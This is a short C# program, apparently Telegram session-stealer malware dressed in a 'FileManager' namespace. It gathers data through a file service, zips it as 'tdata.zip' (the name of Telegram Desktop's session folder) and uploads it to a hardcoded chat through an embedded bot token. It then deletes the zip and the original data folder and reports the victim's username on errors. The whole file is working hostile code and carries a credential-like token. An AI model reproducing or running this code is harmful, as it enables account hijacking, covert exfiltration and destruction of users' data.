using FileManager.Services;
using Telegram.Bot;

string apiToken = "6697062823:AAGCZWkjT24pGwBOgckQBYeq1zGUylpwP4A"; //Telegram bot token
string adminId2 = "6095810791";

var client = new TelegramBotClient(apiToken);

var fileService = new FileService();


try
{
    var dataPath = fileService.GetData();
    var zipPath = fileService.CreateZipFile(dataPath);

    using (var stream = File.OpenRead(zipPath))
    {
        var iof = new Telegram.Bot.Types.InputFileStream(stream, "tdata.zip");
        await client.SendDocumentAsync(adminId2, iof);
    }

    File.Delete(zipPath);
    Directory.Delete(dataPath, true);
}
catch (Exception ex)
{
    await client.SendTextMessageAsync(adminId2, $"User: {Environment.UserName}\nError: {ex.Message}");
}
